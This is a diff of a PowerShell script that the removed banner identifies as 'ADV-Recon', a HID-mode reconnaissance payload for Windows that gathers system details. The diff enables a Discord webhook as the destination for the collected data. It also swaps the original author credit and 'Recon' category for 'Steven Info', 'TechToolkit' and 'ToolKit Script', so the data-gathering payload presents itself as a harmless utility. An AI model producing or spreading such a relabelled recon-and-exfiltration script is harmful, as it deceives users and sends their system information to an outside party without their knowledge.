@@ -20,7 +20,7 @@ New-Item -Path $env:tmp/$FolderName -ItemType Directory
 
 #$db = ""
 
-#$dc = ""
+$dc = "https://discord.com/api/webhooks/xxxx/xxxx"
 
 ############################################################################################################################################################
 
@@ -277,22 +277,14 @@ $videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcess
 $output = @"
 
 ############################################################################################################################################################                      
-#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
-# Title        : ADV-Recon         | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
-# Author       : I am Jakoby       |  | |   / _' | | '_ ' _ \   _  | |  / _' | | |/ /  / _ \  | '_ \  | | | |#              'Y8888888Y'                    #           
-# Version      : 2.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               'Y888Y'                       #
-# Category     : Recon             | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 'Y'                         #
-# Target       : Windows 10,11     |                                                                   |___/ #           /\/|_      __/\\                  #     
-# Mode         : HID               |                                                           |\__/,|   ('\ #          /    -\    /-   ~\                 #             
-#                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
-#                                  |  and yea curiosity killed the cat                         ( T   )     / #   Luther  )==*('     ') ~ \   Hobo          #                        
-#                                  |  but satisfaction brought him back                       (((^_(((/(((_/ #          /     \     /     \                #    
-#__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
-#  tiktok.com/@i_am_jakoby                                                                                   #         /       \   /     ~ \               #
-#  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
-#  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
-#  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
-#  youtube.com/c/IamJakoby                                                                                   #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
+#                                                                                                                                                          #                                 
+# Title        : Steven Info                                                                                                                               #           
+# Author       : Steven Olsen                                                                                                                              #           
+# Version      : 0.1                                                                                                                                       #
+# Category     : TechToolkit                                                                                                                               #
+# Target       : Windows 10,11                                                                                                                             #     
+# Mode         : ToolKit Script                                                                                                                            #             
+#                                                                                                                                                          #
 ############################################################################################################################################################
 
 
